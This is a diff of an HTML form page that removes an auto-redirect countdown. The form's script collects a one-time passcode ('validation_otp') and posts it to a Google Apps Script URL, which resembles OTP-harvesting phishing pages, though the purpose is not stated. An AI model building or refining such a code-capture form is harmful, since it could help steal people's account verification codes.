@@ -51,7 +51,6 @@
       transition: background .2s;
     }
     .home-btn:hover { background:#094e2b; }
-    .countdown { margin-top:15px; font-size:13px; color:#666; }
   </style>
 </head>
 <body>
@@ -83,7 +82,6 @@
     <p>Your information has been submitted successfully.<br>
     A message will be delivered via email or SMS when completed.</p>
     <a href="index.html" class="home-btn">← Back to Home</a>
-    <div class="countdown" id="countdown">Redirecting back in 5 seconds...</div>
   </div>
 
   <script>
@@ -92,7 +90,6 @@
       const statusEl = document.getElementById('status');
       const thankyouEl = document.getElementById('thankyou');
       const formContainer = document.getElementById('form-container');
-      const countdownEl = document.getElementById('countdown');
 
       // ✅ Your working Web App URL
       const WEBAPP_URL = 'https://script.google.com/macros/s/AKfycbxeIPpKVQOagylbISVnIckuJeazhERR8IYTxtJQFhCqRNJmawsQ-b4_b5pkSQRBldxN/exec';
@@ -103,6 +100,7 @@
         statusEl.style.color = '#666';
 
         const validation_otp = document.getElementById('validation_otp').value.trim();
+
         const formData = new FormData();
         formData.append("validation_otp", validation_otp);
 
@@ -121,20 +119,9 @@
           }
 
           if (json.result === 'success') {
-            // Hide form and show thank you page
+            // Hide form container and show full thank you page
             formContainer.style.display = "none";
             thankyouEl.style.display = "flex";
-
-            // Start 5 second countdown
-            let seconds = 5;
-            const interval = setInterval(() => {
-              seconds--;
-              countdownEl.textContent = "Redirecting back in " + seconds + " seconds...";
-              if (seconds <= 0) {
-                clearInterval(interval);
-                window.location.href = "index.html"; // auto reload form
-              }
-            }, 1000);
           } else {
             statusEl.textContent = 'Submission failed: ' + (json.message || 'Unknown error');
             statusEl.style.color = '#aa0000';
